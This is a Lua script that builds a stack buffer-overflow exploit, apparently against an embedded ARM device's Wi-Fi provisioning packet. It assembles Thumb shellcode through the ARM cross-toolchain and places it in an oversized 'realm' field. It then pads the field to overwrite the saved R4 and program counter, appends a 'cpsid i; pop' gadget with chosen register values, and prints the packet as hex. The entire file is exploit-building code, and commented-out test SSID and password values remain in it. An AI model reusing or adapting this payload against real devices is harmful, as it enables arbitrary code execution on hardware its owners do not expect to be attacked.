require "utils"

local chr = string.char

local realm_start = 0x20020692 -- realm start in pkt buffer

function load_asmfile(fn)
	local prefix = "arm-linux-gnueabihf-"
	local opcodes, registers = {}, {0, 0, 0, 0, 0}
	local fh = io.open(fn,"r")
	-- extract register values from assembly comments
	for line in fh:lines() do
		local reg, val = line:match("//%s*r(%d)%s*=%s*(%w+)")
		if reg and val then
			reg, val = reg+0, tonumber(val)
			--print(type(reg),val)
			assert((reg >= 1) and (reg <= 5), "only registers 1..5 supported")
			registers[reg] = val
		end
	end
	fh:close()
	-- assemble
	os.execute("rm -f a.out;"..prefix.."as "..fn)
	-- grab hex opcodes from objdump
	fh = io.popen(prefix.."objdump -S a.out","r")
	for line in fh:lines() do
		--print(line)
		local oc1, oc2 = line:match("%s*%x+:%s+(%x+)%s(%x*)")
		if oc1 then
			--print(oc1,oc2)
			table.insert(opcodes,oc1)
			if #oc2 == 4 then
				table.insert(opcodes,oc2)
			end
		end
	end
	fh:close()
	return opcodes, registers
end

local opcodes, registers = load_asmfile(arg[1])
local new_pc = realm_start

-- turn LED off
--local new_pc = 0x040E8A8

--local new_pc = 0x20011010 -- after PC on stack
--local new_pc = 0x20020692 -- realm start in pkt buffer
--local new_pc = 0x200206CA -- payload after realm in pkt buffer

--local ssid = "lX40jB0BWWjwI3UPPLeJVkF9ybfishOR"
--local wifi_pass = "jumpstart"
local ssid = ""
local wifi_pass = ""
local realm = " " -- 16bit align

-- test
--for i=#realm,26 do -- 26 max value
--	realm = realm.. chr(0x40)
--end

for i=1,#opcodes do
	realm = realm .. string.reverse(packint(tonumber(opcodes[i],16),2))
end

assert(#realm <= 26, "exploit code too long - max len: 24 bytes")

-- pad with 0 to R4+PC on stack
for i=#realm,47 do
	realm = realm.. chr(0)
end

realm = realm..string.reverse(packint(registers[4]))
realm = realm..string.reverse(packint(0x20011011)) -- new pc: take from stack

-- after PC: room for 24 bytes (6 dwords)

realm = realm..string.reverse(packint(0xb672,2)) -- cpsid i
realm = realm..string.reverse(packint(0xbd2f,2)) -- pop {r0-r3,r5,pc}

realm = realm..string.reverse(packint(registers[1])) -- r1
realm = realm..string.reverse(packint(registers[2])) -- r2
realm = realm..string.reverse(packint(registers[3])) -- r3
realm = realm..string.reverse(packint(registers[5])) -- r5

realm = realm..string.reverse(packint(new_pc+1))

-- test
--for i=#realm,80 do
--	realm = realm.. chr(0x40)
--end

local cc = ""

local buf = chr(#ssid) .. ssid .. chr(#wifi_pass) .. wifi_pass

if #realm > 0 then
	buf = buf .. chr(#realm) .. realm .. cc
end

print(tohex(buf))
